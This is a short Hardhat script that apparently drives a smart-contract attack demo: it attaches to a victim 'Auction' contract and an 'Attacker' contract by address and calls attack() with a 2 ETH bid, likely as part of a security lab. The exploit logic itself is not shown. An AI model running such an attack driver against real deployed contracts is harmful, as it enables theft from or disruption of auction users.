const hre = require("hardhat");

let deployer, attacker, auction;

const auctionAddress = process.env.VICTIM_ADDRESS;
const attackerAddress = process.env.ATTACKER_ADDRESS;

async function main() {
	const provider = hre.ethers.provider;
	[deployer] = await hre.ethers.getSigners();

	const auctionFactory = await hre.ethers.getContractFactory("Auction");
	const attackerFactory = await hre.ethers.getContractFactory("Attacker");

	auction = auctionFactory.attach(auctionAddress);
	attacker = attackerFactory.attach(attackerAddress);

	console.log("Starting attack bid...");
	const bidAmount = hre.ethers.parseEther("2");
	const tx = await attacker
		.connect(deployer)
		.attack(auctionAddress, { value: bidAmount });
}

main()
	.then(() => process.exit(0))
	.catch((error) => {
		console.error(error);
		process.exit(1);
	});
